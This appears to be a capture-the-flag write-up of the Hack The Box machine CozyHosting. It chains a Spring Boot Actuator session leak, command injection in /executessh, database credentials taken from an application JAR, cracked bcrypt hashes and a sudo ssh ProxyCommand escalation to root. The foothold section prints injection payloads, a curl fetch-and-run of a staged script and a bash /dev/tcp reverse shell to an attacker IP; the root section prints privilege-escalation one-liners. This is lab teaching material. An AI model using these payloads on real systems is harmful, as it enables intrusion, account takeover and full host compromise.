---
layout: post
title: "HTB: CozyHosting"
subtitle: "Spring Boot Actuator session leak, command injection in /executessh, cracked bcrypt to SSH, sudo ssh ProxyCommand to root"
date: 2023-09-03
tags: [htb, linux, command-injection, info-disclosure, privesc]
category: writeups
kind: machine
tldr: "An exposed Spring Boot Actuator handed me a live admin JSESSIONID. The admin panel's /executessh endpoint dropped the username straight into a shell command, so ${IFS} past the whitespace filter gave a shell as app. Postgres creds from the application JAR let me dump and crack an admin bcrypt hash, which logged josh in over SSH. sudo /usr/bin/ssh with a ProxyCommand gave root."
---

## the box

CozyHosting is an easy Linux box built around a Java Spring Boot web app. nginx 1.18.0 on port `80` fronts the application, which actually runs on local `8080`. The interesting part of the box is entirely in the Spring stack: a misconfigured Actuator leaks live sessions, an admin feature injects into a shell, and the JAR on disk carries the database password. Privesc is a clean `sudo ssh` abuse.

## recon

Full TCP scan first, then version detection on what was open.

```bash
nmap -p- --min-rate 10000 10.129.95.228
nmap -p22,80 -sCV 10.129.95.228
```

Two ports.

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
```

OpenSSH 8.9p1 pins this to Ubuntu 22.04. Port 80 redirects to `cozyhosting.htb`, so I added that to `/etc/hosts`:

```bash
echo '10.129.95.228 cozyhosting.htb' | sudo tee -a /etc/hosts
```

The site is a hosting-company landing page with a `/login`. Content discovery against the root turned up the obvious routes plus something far more useful.

```
/index   (Status: 200)
/login   (Status: 200)
/logout  (Status: 204)
```

The `/login` page and the framework fingerprint (Spring's default Whitelabel error page on a bad route) said Spring Boot, so I ran discovery again with a Spring-specific wordlist looking for Actuator endpoints. They were wide open:

```
[200] /actuator
[200] /actuator/env
[200] /actuator/health
[200] /actuator/sessions
[200] /actuator/mappings
[200] /actuator/beans
```

Actuator is Spring Boot's management surface. In production it should be locked behind auth or disabled. Here it answered unauthenticated. The index listed exactly what was exposed:

```bash
curl -s http://cozyhosting.htb/actuator --header "Content-Type: application/json" | jq
```

```json
{
  "_links": {
    "self":     { "href": "http://localhost:8080/actuator" },
    "sessions": { "href": "http://localhost:8080/actuator/sessions" },
    "beans":    { "href": "http://localhost:8080/actuator/beans" },
    "health":   { "href": "http://localhost:8080/actuator/health" },
    "env":      { "href": "http://localhost:8080/actuator/env" },
    "mappings": { "href": "http://localhost:8080/actuator/mappings" }
  }
}
```

`/actuator/env` confirmed the app reads an `application.properties` out of `cloudhosting-0.0.1.jar` and runs on `127.0.0.1:8080` behind the nginx reverse proxy. The values were masked with `******`, so env was a map of the box, not a credential dump. The win was `/actuator/sessions`, which maps every live `JSESSIONID` to the username it belongs to:

```bash
curl -s http://cozyhosting.htb/actuator/sessions --header "Content-Type: application/json" | jq
```

```json
{
  "AE398A2BA899A092C97EDFAFDF4F781E": "UNAUTHORIZED",
  "A0F3EA897AB3AAE89DD2E4AC6975C649": "kanderson",
  "FE773B92F068E412D09EFB5F1C1300E6": "UNAUTHORIZED"
}
```

`kanderson` had an authenticated session sitting right there. The two `UNAUTHORIZED` entries are anonymous visitors. That `A0F3...` value is a working admin session token if I just become it. The endpoint refreshes live, so re-curling it during the box gives whatever the admin's current session ID is.

## foothold

Stealing the session is a cookie swap. Spring tracks the session with a `JSESSIONID` cookie, so I set mine to the leaked value and hit `/admin`. The first try from a fresh browser session did not take cleanly, so I drove it through Burp: send a request to `/admin` with the leaked cookie, intercept, and replay it carrying `JSESSIONID=A0F3EA897AB3AAE89DD2E4AC6975C649`. That landed me in the admin dashboard.

```bash
curl http://cozyhosting.htb/admin --cookie "JSESSIONID=A0F3EA897AB3AAE89DD2E4AC6975C649"
```

The admin panel has an "add host" feature that connects to a server over SSH. It posts `username` and `host` to `/executessh`. That endpoint is the foothold. I confirmed how it works later by pulling the class out of the JAR, but the behavior is obvious from probing: it shells out to run `ssh user@host` and reflects the error back. Decompiled, the handler is `ComplianceService`:

```java
@RestController
public class ComplianceService {
    private final Pattern HOST_PATTERN = Pattern.compile("^(?=.{1,255}$)[0-9A-Za-z]...");

    @RequestMapping(method = {RequestMethod.POST}, path = {"/executessh"})
    public void executeOverSsh(@RequestParam("username") String username,
                               @RequestParam("host") String host,
                               HttpServletResponse response) throws IOException {
        ...
        validateHost(host);
        validateUserName(username);
        Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c",
            String.format("ssh -o ConnectTimeout=1 %s@%s", username, host)});
        ...
    }

    private void validateUserName(String username) {
        if (username.contains(" ")) {
            throw new IllegalArgumentException("Username can't contain whitespaces!");
        }
    }

    private void validateHost(String host) {
        if (!this.HOST_PATTERN.matcher(host).matches()) {
            throw new IllegalArgumentException("Invalid hostname!");
        }
    }
}
```

This is the textbook command-injection mistake. The user input is concatenated into a `/bin/bash -c` string with `String.format`, then handed to `Runtime.exec`. The `host` field is locked down by a strict hostname regex, but `username` is only checked for one thing: it must not contain a literal space. Everything else, including `;`, `$`, `{`, `}`, `&`, is allowed. So `username` is a shell-command-injection sink and the only constraint is no whitespace.

I close the `ssh` invocation with `;`, run my own command, and use `${IFS}` (the shell's internal field separator, which expands to whitespace) in place of every space. First a callback to prove execution, with my host on `:8000`:

```
host=127.0.0.1&username=;curl${IFS}http://10.10.14.105:8000/;
```

A hit landed on my listener, so injection worked. Brace expansion is an equivalent whitespace-free form and works just as well:

```
host=127.0.0.1&username=;{curl,http://10.10.14.105:8000/};#
```

With execution confirmed, I swapped in a reverse shell. The trick is the same whitespace problem, so rather than fight `${IFS}` inside a bash one-liner I staged it: drop the payload in a file, curl it down, run it. The script I served was a standard bash callback:

```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.105/4444 0>&1
```

Then the `/executessh` body to fetch and run it (every space is `${IFS}`):

```
host=127.0.0.1&username=;curl${IFS}10.10.14.105:8000/shell${IFS}-o${IFS}/tmp/shell;bash${IFS}/tmp/shell;#
```

The listener caught the connection as the `app` user:

```
rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.106.27 51972
bash: cannot set terminal process group (1039): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$
```

## user

The app ran out of `/app`, and `cloudhosting-0.0.1.jar` was sitting right there. That JAR is just a ZIP, and Spring bundles its config under `BOOT-INF/classes/`. Always check `application.properties`, manifests, and the resources folder when you have an application archive. I copied it off the box and unzipped it (`/dev/shm` works fine on the box too):

```bash
unzip cloudhosting-0.0.1.jar
cat BOOT-INF/classes/application.properties
```

```properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

That line at the bottom is the whole reason this property file matters. The Actuator `env` masking had hidden it, but on disk it is plaintext. PostgreSQL is listening on `127.0.0.1:5432` (confirmed with `ss -tlnp` from the app shell, which also showed java on `8080` and python on `7888`):

```
tcp LISTEN 0 244   127.0.0.1:5432     0.0.0.0:*
tcp LISTEN 0 100   127.0.0.1:8080     *:*    users:(("java",pid=1039,fd=19))
```

I connected with the leaked creds and dumped the users table:

```bash
psql -U postgres -h localhost -p 5432 -W
# password: Vg&nvzAQ7XxR
```

```sql
SELECT * FROM users;
```

```
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

Two bcrypt hashes (`$2a$10$`, cost 10). bcrypt is slow, so I only bothered with the admin one. john cracked it off rockyou:

```bash
john --wordlist=rockyou.txt hash
```

```
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
manchesterunited (?)
1g 0:00:00:25 DONE (2023-09-03 20:21)
```

Hashcat mode 3200 does the same job (`hashcat -m 3200 hash rockyou.txt`). The cracked password belongs to no obvious account name, but the box has a local user the creds get reused for. `/etc/passwd` showed a `josh`, and the admin password worked for SSH as `josh`:

```bash
ssh josh@cozyhosting.htb
# password: manchesterunited
```

```
josh@cozyhosting:~$ cat user.txt
```

josh held the user flag.

## root

`sudo -l` as josh (with the SSH password) was a one-line answer:

```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

josh can run `ssh` as root with any arguments. The OpenSSH client is on GTFOBins for exactly this reason: the `ProxyCommand` option is passed to `/bin/sh -c`, so anything in it executes with the privileges of the user running ssh. Running ssh as root means the ProxyCommand runs as root. The GTFOBins one-liner spawns an interactive shell with stdin/stdout wired to stderr:

```bash
sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```

A non-interactive variant works just as well if you prefer a SUID drop: `sudo ssh -o ProxyCommand='cp /bin/bash /tmp/rootbash' x` then `sudo ssh -o ProxyCommand='chmod 6777 /tmp/rootbash' x` and `/tmp/rootbash -p`. Either way it is root.

## takeaway

Actuator should never be reachable unauthenticated. The session leak was the entire chain's ignition, the command injection only needed `${IFS}` to step around a filter that checked for the single character it should not have trusted, and the rest was credential reuse out of a JAR that shipped its database password in cleartext. `sudo ssh` is a free root shell through ProxyCommand any time it shows up in a sudoers rule.
